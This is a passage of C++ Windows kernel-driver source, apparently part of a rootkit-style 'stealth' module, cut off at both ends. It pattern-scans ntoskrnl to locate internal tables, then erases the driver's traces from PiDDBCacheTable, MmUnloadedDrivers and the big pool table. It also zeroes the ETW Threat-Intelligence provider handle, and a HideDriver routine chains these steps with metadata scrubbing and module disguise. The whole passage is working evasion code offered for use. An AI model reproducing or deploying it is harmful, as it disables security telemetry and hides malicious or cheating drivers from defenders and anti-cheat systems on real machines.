        if (validCandidates != 1 || !selectedTablePtr || !selectedSizePtr || !selectedTable || selectedSize == 0) {
            WW_LOG("KVALIDATE build=%lu kind=pattern name=PoolBigPageTable.Win11 source=semantic_scan pattern=win11_bigpool_globals value=%p validation=fail evidence=\"raw=%lu valid=%lu selected_found=%p table_ptr=%p size_ptr=%p table=%p size=%llu sections=%u\" fail_closed=ambiguous_or_missing_candidate",
                ww_kernel_validation_build(),
                selectedTablePtr,
                rawCandidates,
                validCandidates,
                selectedFound,
                selectedTablePtr,
                selectedSizePtr,
                selectedTable,
                static_cast<unsigned long long>(selectedSize),
                nt->FileHeader.NumberOfSections);
            WW_LOG("stealth::ResolveBigPoolTableWin11 fail_closed raw=%lu valid=%lu selected_found=%p table_ptr=%p size_ptr=%p table=%p size=%llu build=%lu",
                rawCandidates,
                validCandidates,
                selectedFound,
                selectedTablePtr,
                selectedSizePtr,
                selectedTable,
                static_cast<unsigned long long>(selectedSize),
                GetNtBuildNumber());
            return false;
        }

        g_PoolBigPageTable = reinterpret_cast<PPOOL_TRACKER_BIG_PAGES*>(selectedTablePtr);
        g_PoolBigPageTableSize = selectedSizePtr;
        g_BigPoolEntryStride = 0x20;
        WW_LOG("KVALIDATE build=%lu kind=layout name=PoolBigPageTable.Win11 source=semantic_scan offset=0x%llx validation=pass evidence=\"found=%p table_ptr=%p size_ptr=%p table=%p size=%llu stride=0x%llx raw=%lu valid=%lu\" fail_closed=none",
            ww_kernel_validation_build(),
            static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(selectedTablePtr) - reinterpret_cast<ULONG_PTR>(ntBase)),
            selectedFound,
            selectedTablePtr,
            selectedSizePtr,
            selectedTable,
            static_cast<unsigned long long>(selectedSize),
            static_cast<unsigned long long>(g_BigPoolEntryStride),
            rawCandidates,
            validCandidates);
        WW_LOG("stealth::ResolveBigPoolTableWin11 selected found=%p table_ptr=%p size_ptr=%p table=%p size=%llu stride=0x%llx raw=%lu",
            selectedFound,
            selectedTablePtr,
            selectedSizePtr,
            selectedTable,
            static_cast<unsigned long long>(selectedSize),
            static_cast<unsigned long long>(g_BigPoolEntryStride),
            rawCandidates);
        return true;
    }

    inline bool ResolveBigPoolTable(PVOID ntBase) {
        LONG state = _InterlockedCompareExchange(&g_BigPoolResolved, 0, 0);
        if (state == 2) {
            return (g_PoolBigPageTable != nullptr);
        }

        LONG prev = _InterlockedCompareExchange(&g_BigPoolResolved, 1, 0);
        if (prev == 2) {
            return (g_PoolBigPageTable != nullptr);
        }
        if (prev == 1) {
            wait_for_state(&g_BigPoolResolved, 2, "big_pool");
            return (g_PoolBigPageTable != nullptr);
        }

        PVOID secCheck[1];
        SIZE_T secCheckSz[1];
        if (!GetExecutableSections(ntBase, secCheck, secCheckSz, 1)) {
            _InterlockedExchange(&g_BigPoolResolved, 2);
            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable", "semantic_scan", "executable_sections", nullptr, FALSE,
                "no executable ntoskrnl sections available for pattern scan", "no_executable_sections");
            return false;
        }

        if (!IsNtBuildKnown()) {
            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable", "semantic_scan", "build_gated", nullptr, FALSE,
                "nt build number could not be resolved", "unknown_nt_build");
            WW_LOG("stealth::ResolveBigPoolTable fail_closed reason=unknown_nt_build");
            _InterlockedExchange(&g_BigPoolResolved, 2);
            return false;
        }

        if (IsWindows11()) {
            bool resolvedWin11 = ResolveBigPoolTableWin11(ntBase);
            KeMemoryBarrier();
            _InterlockedExchange(&g_BigPoolResolved, 2);
            return resolvedWin11;
        }

        static const UCHAR patBigPool[] = {
            0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xC0
        };

        PVOID found = FindPatternInAllSections(ntBase, patBigPool, "xxx????xxx");
        const char* table_pattern = found ? "patBigPool" : "none";
        if (!found) {
            static const UCHAR patBigPoolAlt[] = {
                0x4C, 0x8B, 0x25, 0x00, 0x00, 0x00, 0x00,
                0x4D, 0x85, 0xE4
            };
            found = FindPatternInAllSections(ntBase, patBigPoolAlt, "xxx????xxx");
            if (found) table_pattern = "patBigPoolAlt";
        }

        if (found) {
            PVOID resolved = ResolveRelative(found, 3, 7);
            if (resolved && _MmIsAddressValid(resolved)) {
                g_PoolBigPageTable = (PPOOL_TRACKER_BIG_PAGES*)resolved;
            }
        }

        static const UCHAR patSize[] = {
            0x44, 0x8B, 0x35, 0x00, 0x00, 0x00, 0x00
        };

        found = FindPatternInAllSections(ntBase, patSize, "xxx????");
        const char* size_pattern = found ? "patSize" : "none";
        if (found) {
            PVOID resolved = ResolveRelative(found, 3, 7);
            if (resolved && _MmIsAddressValid(resolved)) {
                g_PoolBigPageTableSize = (SIZE_T*)resolved;
            }
        }

        if (!g_PoolBigPageTableSize) {
            static const UCHAR patSizeAlt[] = {
                0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00
            };

            found = FindPatternInAllSections(ntBase, patSizeAlt, "xx????");
            if (found) size_pattern = "patSizeAlt";
            if (found) {
                PVOID resolved = ResolveRelative(found, 2, 6);
                if (resolved && _MmIsAddressValid(resolved)) {
                    g_PoolBigPageTableSize = (SIZE_T*)resolved;
                }
            }
        }

        KeMemoryBarrier();
        _InterlockedExchange(&g_BigPoolResolved, 2);

        BOOLEAN valid = (g_PoolBigPageTable != nullptr);
        WW_LOG("KVALIDATE build=%lu kind=layout name=PoolBigPageTable source=semantic_scan offset=0x%llx validation=%s evidence=\"table_pattern=%s size_pattern=%s table_ptr=%p size_ptr=%p first_section=%p first_section_size=0x%llx\" fail_closed=%s",
            ww_kernel_validation_build(),
            g_PoolBigPageTable ? static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(g_PoolBigPageTable) - reinterpret_cast<ULONG_PTR>(ntBase)) : 0ull,
            ww_kernel_validation_state(valid),
            table_pattern,
            size_pattern,
            g_PoolBigPageTable,
            g_PoolBigPageTableSize,
            secCheck[0],
            static_cast<unsigned long long>(secCheckSz[0]),
            valid ? "none" : "table_pattern_not_found_or_invalid");
        return (g_PoolBigPageTable != nullptr);
    }

    inline bool CleanBigPoolTable(PVOID ntBase, PVOID driverBase, SIZE_T driverSize) {
        if (!ntBase || !driverBase || driverSize == 0)
            return false;

        if (!ResolveBigPoolTable(ntBase))
            return false;

        if (!g_PoolBigPageTable || !_MmIsAddressValid(g_PoolBigPageTable))
            return false;

        PPOOL_TRACKER_BIG_PAGES table = *g_PoolBigPageTable;
        if (!table || !_MmIsAddressValid(table))
            return false;

        SIZE_T tableSize = 0;
        if (g_PoolBigPageTableSize && _MmIsAddressValid(g_PoolBigPageTableSize)) {
            tableSize = *g_PoolBigPageTableSize;
        }

        if (tableSize == 0 || tableSize > 0x100000) {
            if (IsWindows11()) {
                WW_LOG("stealth::CleanBigPoolTable fail_closed reason=invalid_table_size table=%p size=%llu stride=0x%llx build=%lu",
                    table,
                    static_cast<unsigned long long>(tableSize),
                    static_cast<unsigned long long>(g_BigPoolEntryStride),
                    GetNtBuildNumber());
                return false;
            }
            tableSize = 0x10000;
        }

        SIZE_T entryStride = g_BigPoolEntryStride;
        if (entryStride == 0 || entryStride > 0x20)
            entryStride = sizeof(POOL_TRACKER_BIG_PAGES);

        ULONGLONG driverStart = (ULONGLONG)driverBase;
        ULONGLONG driverEnd = driverStart + driverSize;
        if (driverEnd <= driverStart)
            return false;
        bool cleaned = false;

        for (SIZE_T i = 0; i < tableSize; i++) {
            __try {
                UCHAR* entry = reinterpret_cast<UCHAR*>(table) + (i * entryStride);

                if (!_MmIsAddressValid(entry) || !_MmIsAddressValid(entry + sizeof(ULONGLONG) - 1))
                    continue;

                volatile ULONGLONG va = *reinterpret_cast<volatile ULONGLONG*>(entry);

                if (va >= driverStart && va < driverEnd) {
                    UCHAR zeroEntry[0x20] = {};
                    ULONGLONG hiddenVa = 1;
                    RtlCopyMemory(zeroEntry, &hiddenVa, sizeof(hiddenVa));
                    SIZE_T writeSize = entryStride <= sizeof(zeroEntry) ? entryStride : sizeof(POOL_TRACKER_BIG_PAGES);
                    if (SafeWriteMemory(entry, zeroEntry, writeSize)) {
                        WW_LOG("stealth::CleanBigPoolTable entry_hidden index=%llu entry=%p old_va=0x%llx stride=0x%llx write=0x%llx build=%lu",
                            static_cast<unsigned long long>(i),
                            entry,
                            static_cast<unsigned long long>(va),
                            static_cast<unsigned long long>(entryStride),
                            static_cast<unsigned long long>(writeSize),
                            GetNtBuildNumber());
                        cleaned = true;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }

        return cleaned;
    }

    inline PVOID g_MmUnloadedDriversLock = nullptr;

    inline bool CleanMmUnloadedDrivers(PVOID ntBase) {
        if (!IsNtBuildKnown()) {
            WW_KERNEL_PATTERN_LOG_PTR("MmUnloadedDrivers", "semantic_scan", "build_gated", nullptr, FALSE,
                "nt build number could not be resolved", "unknown_nt_build");
            WW_LOG("stealth::CleanMmUnloadedDrivers fail_closed reason=unknown_nt_build");
            return false;
        }

        if (IsWindows11()) {
            WW_KERNEL_PATTERN_LOG_PTR("MmUnloadedDrivers", "semantic_scan", "legacy_patterns", nullptr, FALSE,
                "Windows 11 write path intentionally unverified", "mm_unloaded_write_path_unverified");
            WW_LOG("stealth::CleanMmUnloadedDrivers fail_closed_windows11 build=%lu reason=mm_unloaded_write_path_unverified",
                GetNtBuildNumber());
            return false;
        }

        static const UCHAR pat1[] = {
            0x4C, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0xC9
        };

        static const UCHAR pat2[] = {
            0x4C, 0x8B, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0xC9, 0x4D, 0x85, 0x00, 0x74
        };

        static const UCHAR pat3[] = {
            0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0xF9
        };

        static const UCHAR pat4[] = {
            0x4C, 0x8B, 0x2D, 0x00, 0x00, 0x00, 0x00,
            0x4D, 0x85, 0xED
        };

        PVOID found = FindPatternInAllSections(ntBase, pat1, "xxx????xxx");
        const char* pattern_name = found ? "pat1" : "none";
        if (!found)
            found = FindPatternInAllSections(ntBase, pat2, "xx?????xxxxx?x");
        if (found && pattern_name[0] == 'n') pattern_name = "pat2";
        if (!found)
            found = FindPatternInAllSections(ntBase, pat3, "xxx????xxx");
        if (found && pattern_name[0] == 'n') pattern_name = "pat3";
        if (!found)
            found = FindPatternInAllSections(ntBase, pat4, "xxx????xxx");
        if (found && pattern_name[0] == 'n') pattern_name = "pat4";
        if (!found) {
            WW_KERNEL_PATTERN_LOG_PTR("MmUnloadedDrivers", "semantic_scan", "legacy_patterns", nullptr, FALSE,
                "pat1/pat2/pat3/pat4 did not match executable ntoskrnl sections", "pattern_not_found");
            return false;
        }

        int dispOffset = 3;
        if (*(UCHAR*)found == 0x48) {
            dispOffset = 3;
        } else {
            dispOffset = 3;
        }

        PVOID pMmUnloadedDrivers = ResolveRelative(found, dispOffset, 7);
        if (!pMmUnloadedDrivers || !_MmIsAddressValid(pMmUnloadedDrivers)) {
            WW_LOG("KVALIDATE build=%lu kind=pattern name=MmUnloadedDrivers source=semantic_scan pattern=%s value=%p validation=fail evidence=\"found=%p disp=%d resolved=%p\" fail_closed=resolved_pointer_invalid",
                ww_kernel_validation_build(),
                pattern_name,
                pMmUnloadedDrivers,
                found,
                dispOffset,
                pMmUnloadedDrivers);
            return false;
        }

        PMM_UNLOADED_DRIVER arr = *reinterpret_cast<PMM_UNLOADED_DRIVER*>(pMmUnloadedDrivers);
        if (!arr || !_MmIsAddressValid(arr)) {
            WW_LOG("KVALIDATE build=%lu kind=layout name=MmUnloadedDrivers source=semantic_scan offset=0x%llx validation=fail evidence=\"pattern=%s found=%p global=%p array=%p\" fail_closed=array_pointer_invalid",
                ww_kernel_validation_build(),
                static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(pMmUnloadedDrivers) - reinterpret_cast<ULONG_PTR>(ntBase)),
                pattern_name,
                found,
                pMmUnloadedDrivers,
                arr);
            return false;
        }

        if (!g_MmUnloadedDriversLock) {
            for (int off = 0x10; off < 0x100; off++) {
                UCHAR* scan = (UCHAR*)found - off;
                if (!_MmIsAddressValid(scan))
                    break;

                if (scan[0] == 0x48 && scan[1] == 0x8D && scan[2] == 0x0D) {
                    PVOID cand = ResolveRelative(scan, 3, 7);
                    if (cand && _MmIsAddressValid(cand) && cand != pMmUnloadedDrivers) {
                        g_MmUnloadedDriversLock = cand;
                        break;
                    }
                }
            }
        }

        bool lockHeld = false;
        if (g_MmUnloadedDriversLock && _KeEnterCriticalRegion && _ExAcquireResourceExclusiveLite) {
            _KeEnterCriticalRegion();
            if (_ExAcquireResourceExclusiveLite(g_MmUnloadedDriversLock, TRUE)) {
                lockHeld = true;
            }
        }

        bool modified = false;
        constexpr ULONG MI_MAX_UNLOADED_DRIVERS = 50;

        for (ULONG i = 0; i < MI_MAX_UNLOADED_DRIVERS; i++) {
            PMM_UNLOADED_DRIVER e = &arr[i];
            if (!_MmIsAddressValid(e))
                break;

            if (e->Name.Buffer && e->Name.Length > 0 &&
                _MmIsAddressValid(e->Name.Buffer)) {

                SafeWriteMemory(e->Name.Buffer, nullptr, e->Name.MaximumLength);

                MM_UNLOADED_DRIVER zeroEntry = {};
                SafeWriteMemory(e, &zeroEntry, sizeof(MM_UNLOADED_DRIVER));
                modified = true;
            }
        }

        if (lockHeld && g_MmUnloadedDriversLock && _ExReleaseResourceLite && _KeLeaveCriticalRegion) {
            _ExReleaseResourceLite(g_MmUnloadedDriversLock);
            _KeLeaveCriticalRegion();
        }

        WW_LOG("KVALIDATE build=%lu kind=layout name=MmUnloadedDrivers source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=%s found=%p global=%p array=%p lock=%p modified=%u max_entries=50\" fail_closed=%s",
            ww_kernel_validation_build(),
            static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(pMmUnloadedDrivers) - reinterpret_cast<ULONG_PTR>(ntBase)),
            ww_kernel_validation_state(modified ? TRUE : FALSE),
            pattern_name,
            found,
            pMmUnloadedDrivers,
            arr,
            g_MmUnloadedDriversLock,
            modified ? 1u : 0u,
            modified ? "none" : "no_matching_entries_modified");
        return modified;
    }

    inline bool CleanKernelHashBucketList(PVOID ntBase, UNICODE_STRING* driverName) {
        if (!IsNtBuildKnown()) {
            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "build_gated", nullptr, FALSE,
                "nt build number could not be resolved", "unknown_nt_build");
            WW_LOG("stealth::CleanKernelHashBucketList fail_closed reason=unknown_nt_build");
            return false;
        }

        if (IsWindows11()) {
            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "legacy_patterns", nullptr, FALSE,
                "Windows 11 hash bucket write path intentionally unverified", "hash_bucket_write_path_unverified");
            WW_LOG("stealth::CleanKernelHashBucketList fail_closed_windows11 build=%lu reason=hash_bucket_write_path_unverified",
                GetNtBuildNumber());
            return false;
        }

        if (!driverName || !driverName->Buffer || driverName->Length == 0) {
            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "legacy_patterns", nullptr, FALSE,
                "driver name unavailable for hash bucket validation", "missing_driver_name");
            return false;
        }

        static const UCHAR pat1[] = {
            0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
            0xEB, 0x00, 0xF7, 0x43
        };

        static const UCHAR pat2[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0x5C, 0x24, 0x00, 0x48, 0x83, 0xC4
        };

        static const UCHAR pat3[] = {
            0x48, 0x8B, 0x3D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xFF
        };

        static const UCHAR pat4[] = {
            0x4C, 0x8B, 0x3D, 0x00, 0x00, 0x00, 0x00,
            0x4D, 0x85, 0xFF
        };

        PVOID found = FindPatternInAllSections(ntBase, pat1, "xxx????x?xx");
        bool isMov = true;
        const char* pattern_name = found ? "pat1" : "none";

        if (!found) {
            found = FindPatternInAllSections(ntBase, pat2, "xxx????x????xxxx?xxx");
            isMov = false;
            if (found) pattern_name = "pat2";
        }

        if (!found) {
            found = FindPatternInAllSections(ntBase, pat3, "xxx????xxx");
            isMov = true;
            if (found) pattern_name = "pat3";
        }

        if (!found) {
            found = FindPatternInAllSections(ntBase, pat4, "xxx????xxx");
            isMov = true;
            if (found) pattern_name = "pat4";
        }

        if (!found) {
            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "legacy_patterns", nullptr, FALSE,
                "pat1/pat2/pat3/pat4 did not match executable ntoskrnl sections", "pattern_not_found");
            return false;
        }

        PVOID resolved = ResolveRelative(found, 3, 7);
        if (!resolved || !_MmIsAddressValid(resolved)) {
            WW_LOG("KVALIDATE build=%lu kind=pattern name=PiDDBCacheTable source=semantic_scan pattern=%s value=%p validation=fail evidence=\"found=%p is_mov=%u resolved=%p\" fail_closed=resolved_pointer_invalid",
                ww_kernel_validation_build(),
                pattern_name,
                resolved,
                found,
                isMov ? 1u : 0u,
                resolved);
            return false;
        }

        PLIST_ENTRY listHead = nullptr;

        if (isMov) {
            PVOID* pp = static_cast<PVOID*>(resolved);
            if (_MmIsAddressValid(pp) && *pp && _MmIsAddressValid(*pp)) {
                listHead = static_cast<PLIST_ENTRY>(*pp);
            }
        }
        else {
            listHead = static_cast<PLIST_ENTRY>(resolved);
        }

        if (!listHead || !_MmIsAddressValid(listHead) ||
            !listHead->Flink || !_MmIsAddressValid(listHead->Flink)) {
            WW_LOG("KVALIDATE build=%lu kind=layout name=PiDDBCacheTable source=semantic_scan offset=0x%llx validation=fail evidence=\"pattern=%s found=%p resolved=%p list=%p is_mov=%u\" fail_closed=list_head_invalid",
                ww_kernel_validation_build(),
                static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(resolved) - reinterpret_cast<ULONG_PTR>(ntBase)),
                pattern_name,
                found,
                resolved,
                listHead,
                isMov ? 1u : 0u);
            return false;
        }

        bool cleaned = false;
        PLIST_ENTRY cur = listHead->Flink;
        ULONG safety = 512;

        while (cur != listHead && safety-- > 0) {
            if (!_MmIsAddressValid(cur))
                break;

            PLIST_ENTRY next = cur->Flink;

            PUNICODE_STRING entryName = reinterpret_cast<PUNICODE_STRING>((UCHAR*)cur + 0x10);

            if (_MmIsAddressValid(entryName) &&
                entryName->Length > 0 && entryName->Length < 512 &&
                entryName->Buffer && _MmIsAddressValid(entryName->Buffer) &&
                entryName->Length == driverName->Length) {

                bool match = true;
                USHORT chars = driverName->Length / sizeof(WCHAR);
                for (USHORT i = 0; i < chars; i++) {
                    if (locase_w(entryName->Buffer[i]) != locase_w(driverName->Buffer[i])) {
                        match = false;
                        break;
                    }
                }

                if (match) {
                    RemoveEntryList(cur);
                    cleaned = true;
                }
            }

            cur = next;
        }

        WW_LOG("KVALIDATE build=%lu kind=layout name=PiDDBCacheTable source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=%s found=%p resolved=%p list=%p is_mov=%u cleaned=%u safety_initial=512\" fail_closed=%s",
            ww_kernel_validation_build(),
            static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(resolved) - reinterpret_cast<ULONG_PTR>(ntBase)),
            ww_kernel_validation_state(cleaned ? TRUE : FALSE),
            pattern_name,
            found,
            resolved,
            listHead,
            isMov ? 1u : 0u,
            cleaned ? 1u : 0u,
            cleaned ? "none" : "target_entry_not_found");
        return cleaned;
    }

    inline bool DisableEtwThreatIntel(PVOID ntBase) {
        if (!ntBase) {
            WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider", "semantic_scan", "threatintel_provider", nullptr, FALSE,
                "ntoskrnl base pointer missing", "bad_nt_base");
            return false;
        }

        if (!IsNtBuildKnown()) {
            WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider", "semantic_scan", "build_gated", nullptr, FALSE,
                "nt build number could not be resolved", "unknown_nt_build");
            WW_LOG("stealth::DisableEtwThreatIntel fail_closed reason=unknown_nt_build");
            return false;
        }

        if (IsWindows11()) {
            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
            if (!_MmIsAddressValid(dos) || dos->e_magic != IMAGE_DOS_SIGNATURE) {
                WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider.Win11", "semantic_scan", "win11_provider_handle", nullptr, FALSE,
                    "ntoskrnl DOS signature invalid", "bad_dos_header");
                return false;
            }

            PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) {
                WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider.Win11", "semantic_scan", "win11_provider_handle", nullptr, FALSE,
                    "ntoskrnl NT signature invalid", "bad_nt_headers");
                return false;
            }

            static const UCHAR patWin11[] = {
                0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00,
                0x48, 0x0F, 0x44, 0xF0, 0x48, 0x8B, 0xD6, 0xE8
            };

            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
            PVOID selectedHandle = nullptr;
            PVOID selectedFound = nullptr;
            UINT64 selectedValue = 0;
            ULONG rawCandidates = 0;
            ULONG validCandidates = 0;

            for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; ++s) {
                if (!(sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
                    continue;

                PVOID sectionBase = static_cast<UCHAR*>(ntBase) + sections[s].VirtualAddress;
                ULONG sectionSize = sections[s].Misc.VirtualSize;
                ULONG searchOffset = 0;

                for (;;) {
                    if (searchOffset >= sectionSize)
                        break;

                    PVOID searchBase = static_cast<UCHAR*>(sectionBase) + searchOffset;
                    ULONG remaining = sectionSize - searchOffset;
                    PVOID found = FindPatternSafe(searchBase, remaining, patWin11, "xxx????xxxxxxxx");
                    if (!found)
                        break;

                    rawCandidates++;
                    PVOID handle = ResolveRelative(found, 3, 7);
                    UINT64 currentValue = 0;
                    bool valid = ProviderHandleTargetIsSane(ntBase, handle, &currentValue);
                    WW_LOG("stealth::DisableEtwThreatIntel win11_candidate section=%u found=%p handle=%p valid=%u current=0x%llx raw=%lu valid_count=%lu",
                        s,
                        found,
                        handle,
                        valid ? 1u : 0u,
                        static_cast<unsigned long long>(currentValue),
                        rawCandidates,
                        validCandidates + (valid ? 1u : 0u));

                    if (valid) {
                        validCandidates++;
                        if (validCandidates == 1) {
                            selectedHandle = handle;
                            selectedFound = found;
                            selectedValue = currentValue;
                        }
                    }

                    ULONG consumed = static_cast<ULONG>(
                        static_cast<UCHAR*>(found) - static_cast<UCHAR*>(sectionBase)) + 1;
                    if (consumed <= searchOffset || consumed >= sectionSize)
                        break;
                    searchOffset = consumed;
                }
            }

            if (validCandidates != 1 || !selectedHandle) {
                WW_LOG("KVALIDATE build=%lu kind=pattern name=EtwThreatIntelProvider.Win11 source=semantic_scan pattern=win11_provider_handle value=%p validation=fail evidence=\"raw=%lu valid=%lu selected=%p sections=%u\" fail_closed=ambiguous_or_missing_candidate",
                    ww_kernel_validation_build(),
                    selectedHandle,
                    rawCandidates,
                    validCandidates,
                    selectedHandle,
                    nt->FileHeader.NumberOfSections);
                WW_LOG("stealth::DisableEtwThreatIntel fail_closed_windows11 raw=%lu valid=%lu selected=%p build=%lu",
                    rawCandidates,
                    validCandidates,
                    selectedHandle,
                    GetNtBuildNumber());
                return false;
            }

            if (selectedValue == 0) {
                WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider.Win11 source=semantic_scan offset=0x%llx validation=pass evidence=\"found=%p handle=%p current=0 raw=%lu valid=%lu\" fail_closed=none",
                    ww_kernel_validation_build(),
                    static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(selectedHandle) - reinterpret_cast<ULONG_PTR>(ntBase)),
                    selectedFound,
                    selectedHandle,
                    rawCandidates,
                    validCandidates);
                WW_LOG("stealth::DisableEtwThreatIntel already_disabled_windows11 found=%p handle=%p build=%lu",
                    selectedFound,
                    selectedHandle,
                    GetNtBuildNumber());
                return true;
            }

            ULONG64 zeroHandle = 0;
            bool writeOk = SafeWriteMemory(selectedHandle, &zeroHandle, sizeof(zeroHandle));
            WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider.Win11 source=semantic_scan offset=0x%llx validation=%s evidence=\"found=%p handle=%p old=0x%llx raw=%lu valid=%lu write_ok=%u\" fail_closed=%s",
                ww_kernel_validation_build(),
                static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(selectedHandle) - reinterpret_cast<ULONG_PTR>(ntBase)),
                ww_kernel_validation_state(writeOk ? TRUE : FALSE),
                selectedFound,
                selectedHandle,
                static_cast<unsigned long long>(selectedValue),
                rawCandidates,
                validCandidates,
                writeOk ? 1u : 0u,
                writeOk ? "none" : "safe_write_failed");
            WW_LOG("stealth::DisableEtwThreatIntel write_windows11 found=%p handle=%p old=0x%llx ok=%u build=%lu",
                selectedFound,
                selectedHandle,
                static_cast<unsigned long long>(selectedValue),
                writeOk ? 1u : 0u,
                GetNtBuildNumber());
            return writeOk;
        }

        static const UCHAR patThreatInt[] = {
            0x48, 0x83, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x74
        };

        static const UCHAR patThreatIntAlt[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x89, 0x44, 0x24
        };

        PVOID found = FindPatternInAllSections(ntBase, patThreatInt, "xxx?????x");
        if (found) {
            PVOID provHandle = ResolveRelative(found, 3, 8);
            if (provHandle && _MmIsAddressValid(provHandle)) {
                ULONG64 zeroHandle = 0;
                bool ok = SafeWriteMemory(provHandle, &zeroHandle, sizeof(zeroHandle));
                WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=patThreatInt found=%p handle=%p write_ok=%u\" fail_closed=%s",
                    ww_kernel_validation_build(),
                    static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(provHandle) - reinterpret_cast<ULONG_PTR>(ntBase)),
                    ww_kernel_validation_state(ok ? TRUE : FALSE),
                    found,
                    provHandle,
                    ok ? 1u : 0u,
                    ok ? "none" : "safe_write_failed");
                return ok;
            }
        }

        found = FindPatternInAllSections(ntBase, patThreatIntAlt, "xxx????xxxx");
        if (found) {
            PVOID provReg = ResolveRelative(found, 3, 7);
            if (provReg && _MmIsAddressValid(provReg)) {
                ULONG64 zero = 0;
                bool ok = SafeWriteMemory(provReg, &zero, sizeof(zero));
                WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=patThreatIntAlt found=%p handle=%p write_ok=%u\" fail_closed=%s",
                    ww_kernel_validation_build(),
                    static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(provReg) - reinterpret_cast<ULONG_PTR>(ntBase)),
                    ww_kernel_validation_state(ok ? TRUE : FALSE),
                    found,
                    provReg,
                    ok ? 1u : 0u,
                    ok ? "none" : "safe_write_failed");
                return ok;
            }
        }

        WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider", "semantic_scan", "legacy_patterns", nullptr, FALSE,
            "patThreatInt and patThreatIntAlt did not resolve a valid provider handle", "pattern_not_found");
        return false;
    }

    inline void HideDriver(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return;

        SetupStealthFunctions();

        PVOID ntBase  = (PVOID)get_nt_base();
        auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);

        if (ntBase && ldrEntry->BaseDllName.Buffer) {
            CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
        }

        if (ntBase) {
            CleanMmUnloadedDrivers(ntBase);
        }

        if (ntBase && ldrEntry->DllBase && ldrEntry->SizeOfImage) {
            CleanBigPoolTable(ntBase, ldrEntry->DllBase, ldrEntry->SizeOfImage);
        }

        if (ntBase) {
            DisableEtwThreatIntel(ntBase);
        }

        ScrubPEMetadata(DriverObject);

        DisguiseModuleEntry(DriverObject);
    }

    struct DELAYED_HIDE_CONTEXT {
        PDRIVER_OBJECT DriverObject;
        volatile LONG  ReadyToHide;
    };

    inline DELAYED_HIDE_CONTEXT g_DelayedHideContext = { nullptr, 0 };
    inline volatile LONG g_DelayedHideThreadActive = 0;

    inline VOID NTAPI DelayedHideThreadRoutine(PVOID StartContext) {
        UNREFERENCED_PARAMETER(StartContext);

        LARGE_INTEGER freq;
        LARGE_INTEGER thread_start = KeQueryPerformanceCounter(&freq);
        _InterlockedExchange(&g_DelayedHideThreadActive, 1);

        UINT64 tsc = __rdtsc();
        ULONG delay_variation = (ULONG)((tsc >> 8) & 0x1F);
        LONG64 base_delay = -30000000LL;
        LONG64 extra_delay = -(LONG64)(delay_variation * 625000LL);

        WW_LOG("stealth_delayed_hide::entry routine=%p pid=%llu tid=%llu ctx=%p driver=%p ready=%ld delay_100ns=%lld variation=%lu",
            reinterpret_cast<PVOID>(&DelayedHideThreadRoutine),
            handle_to_u64(PsGetCurrentProcessId()),
            handle_to_u64(PsGetCurrentThreadId()),
            StartContext,
            g_DelayedHideContext.DriverObject,
            _InterlockedCompareExchange(&g_DelayedHideContext.ReadyToHide, 0, 0),
            base_delay + extra_delay,
            delay_variation);

        LARGE_INTEGER delay;
        delay.QuadPart = base_delay + extra_delay;

